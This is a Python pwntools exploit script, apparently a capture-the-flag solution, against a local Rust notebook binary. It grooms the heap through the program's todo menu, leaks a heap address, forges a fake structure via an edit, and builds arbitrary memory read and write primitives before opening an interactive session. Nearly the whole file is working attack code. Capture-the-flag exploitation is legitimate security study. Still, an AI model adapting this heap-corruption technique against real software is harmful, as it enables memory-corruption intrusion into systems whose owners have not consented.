from pwn import *

sh = process("./target/debug/definitely_safe_notebook_since_i_have_forbid_unsafe_code")
#sh = remote("127.0.0.1", 8888)
tob = lambda x: str(x).encode()
context.arch = 'amd64'

context.terminal = ['tmux', 'splitw', '-h']

def add_todo(name, content_size, content):
    sh.sendlineafter(b'> ', b'1')
    sh.sendafter(b'name: ', name)
    sh.sendlineafter(b'size: ', tob(content_size))
    sh.sendafter(b'content: ', content)

def mark_as_done(index):
    sh.sendlineafter(b'> ', b'2')
    input_data = b','.join([tob(i) for i in index])
    sh.sendlineafter(b'index: ', input_data)
    sh.sendlineafter(b'index: ', b'0')

def edit_to_do(index, content):
    sh.sendlineafter(b'> ', b'3')
    sh.sendlineafter(b'index: ', tob(index))
    sh.sendafter(b'content: ', content)

def print_todo():
    sh.sendlineafter(b'> ', b'4')

# gdb.attach(sh)
context.log_level = 'debug'
for i in range(8):
    add_todo(b'name', 0x10, b'content')
add_todo(b'name', 0x120, b'content')
add_todo(b'name', 0x10, b'content')

mark_as_done([8])
add_todo(b'name', 0x100, b'content')
mark_as_done([1, 2, 3, 4, 5, 6])

print_todo()
sh.recvuntil(b'[03]: name: ')
heap = u64(sh.recv(6).ljust(8, b'\x00'))
log.success("heap: " + hex(heap))

log.info("set up arbitrary read/write")
gdb.attach(sh)

fake_box = heap - 0x530
payload = flat([
    0x41414141,     # padding
    0x41414141,     # padding
    heap + 0x2c10,  # content
    0x120,          # size
    0x120,          # size
    1,              # finished
    0,              # padding
    0x91,           # size
    fake_box,       # fake box
])
edit_to_do(0x3, payload)

def arb_read(addr):
    payload = flat([
        0x41414141,     # padding
        0x41414141,     # padding
        addr,           # content
        0x120,          # size
        0x120,          # size
        1,              # finished
        0,              # padding
        0x91,           # size
        fake_box,       # fake box
    ])
    edit_to_do(0x3, payload)
    print_todo()
    sh.recvuntil(b'[00]: name: ')
    sh.recvuntil(b'content: ')
    data = u64(sh.recv(8))
    return data

def arb_write(addr, data):
    payload = flat([
        0x41414141,     # padding
        0x41414141,     # padding
        addr,           # content
        0x120,          # size
        0x120,          # size
        1,              # finished
        0,              # padding
        0x91,           # size
        fake_box,       # fake box
    ])
    edit_to_do(0x3, payload)
    edit_to_do(0x0, p64(data))



sh.interactive()
